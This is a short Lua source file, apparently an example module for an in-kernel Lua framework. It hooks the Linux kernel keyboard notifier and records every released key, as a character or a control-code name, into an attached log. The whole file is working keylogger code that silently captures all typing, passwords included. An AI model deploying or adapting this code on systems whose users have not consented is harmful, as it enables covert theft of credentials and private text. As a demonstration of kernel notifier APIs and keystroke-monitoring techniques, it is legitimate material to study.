--
-- SPDX-FileCopyrightText: (c) 2023-2026 Ring Zero Desenvolvimento de Software LTDA
-- SPDX-License-Identifier: MIT OR GPL-2.0-only
--

local notifier = require("notifier")
local notify   = require("linux.notify")
local kbd      = require("linux.kbd")

local control = {
	 [0] = "nul",  [1] = "soh",  [2] = "stx",  [3] = "etx",  [4] = "eot",  [5] = "enq",
	 [6] = "ack",  [7] = "bel",  [8] = "bs",   [9] = "ht",  [10] = "nl",  [11] = "vt",
	[12] = "np",  [13] = "cr",  [14] = "so",  [15] = "si",  [16] = "dle", [17] = "dc1",
	[18] = "dc2", [19] = "dc3", [20] = "dc4", [21] = "nak", [22] = "syn", [23] = "etb",
	[24] = "can", [25] = "em",  [26] = "sub", [27] = "esc", [28] = "fs",  [29] = "gs",
	[30] = "rs",  [31] = "us", [127] = "del"
}

local log

local function printable(keysym)
	return keysym >= 32 and keysym <= 126
end

local function callback(event, down, shift, key)
	if not down and event == kbd.KEYSYM then
		local keysym = key & 0xFF
		local char = printable(keysym) and string.char(keysym) or
			string.format("<%s>", control[keysym])
		pcall(log.push, log, char) -- drop silently if full
	end
	return notify.OK
end

notifier.keyboard(callback)

local function attacher(_log)
	log = _log
end
return attacher

